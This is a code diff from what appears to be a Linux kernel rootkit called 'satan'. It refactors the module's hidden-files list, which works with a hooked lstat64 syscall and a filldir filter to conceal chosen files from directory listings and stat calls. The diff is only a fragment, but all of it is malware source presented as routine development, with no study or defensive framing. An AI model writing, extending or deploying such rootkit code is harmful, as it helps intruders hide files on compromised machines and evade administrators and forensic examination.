@@ -36,7 +36,6 @@ static LIST_HEAD(hidden_files_list);  // list of hidden files.
 static struct hidden_file *hidden_files_list_get(const char *path);
 static struct hidden_file *hidden_files_list_add(const char *path);
 static int hidden_files_list_del(const char *path);
-static void hidden_files_list_clear(void);
 
 
 
@@ -67,7 +66,7 @@ static int satan_filldir(struct dir_context *ctx, const char *name, int namlen,
 asmlinkage int (*real_lstat64)(const char __user *filename,
                                struct stat64 __user *statbuf);
 
-static int satan_dummy = 0;
+static int dummy = 0;
 
 asmlinkage long satan_lstat64(const char __user *filename,
                               struct stat64 __user *statbuf)
@@ -76,7 +75,7 @@ asmlinkage long satan_lstat64(const char __user *filename,
         struct hidden_file *f;
         struct list_head *ptr;
 
-        satan_dummy = strncpy_from_user(filename_buf, filename, FILENAME_BUF_SIZE);
+        dummy = strncpy_from_user(filename_buf, filename, FILENAME_BUF_SIZE);
        
         list_for_each(ptr, &hidden_files_list) {
                 f = list_entry(ptr, struct hidden_file, list);
@@ -115,7 +114,7 @@ void satan_file_exit(void)
                 kfree(f->filename);
                 kfree(f);
         }
-
+      
         satan_syscall_unhook(__NR_lstat64);
         real_iterate_shared_list_clear();
 }
@@ -214,35 +213,18 @@ static struct hidden_file *hidden_files_list_add(const char *path)
 
 static int hidden_files_list_del(const char *path)
 {
-        struct hidden_file *f = NULL;
-        struct list_head *ptr = NULL;
-        struct list_head *tmp = NULL;
+        struct hidden_file *f = hidden_files_list_get(path);
 
-        memset(basename_buf, 0, BASENAME_BUF_SIZE);
-        memset(filename_buf, 0, FILENAME_BUF_SIZE);
-        satan_basename(path, basename_buf, BASENAME_BUF_SIZE);
-        satan_filename(path, filename_buf, FILENAME_BUF_SIZE);
+        if (!f)
+                return 1;
 
-        list_for_each_safe(ptr, tmp, &hidden_files_list) {
-                f = list_entry(ptr, struct hidden_file, list);
-
-                if (!strcmp(f->basename, basename_buf) && !strcmp(f->filename, filename_buf)) {
-                        pr_info("satan: file: removing (%s,%s) from list of hidden files.\n", f->basename, f->filename);
-                        list_del(ptr);
-                        kfree(f->fullpath);
-                        kfree(f->basename);
-                        kfree(f->filename);
-                        kfree(f);
-                        return 0;
-                }
-        }
-        
-        return 1;
-}
-
-static void hidden_files_list_clear(void)
-{
-
+        pr_info("satan: file: removing (%s,%s) from list of hidden files.\n", f->basename, f->filename);
+        list_del(&(f->list));
+        kfree(f->fullpath);
+        kfree(f->basename);
+        kfree(f->filename);
+        kfree(f);
+        return 0;
 }
 
 
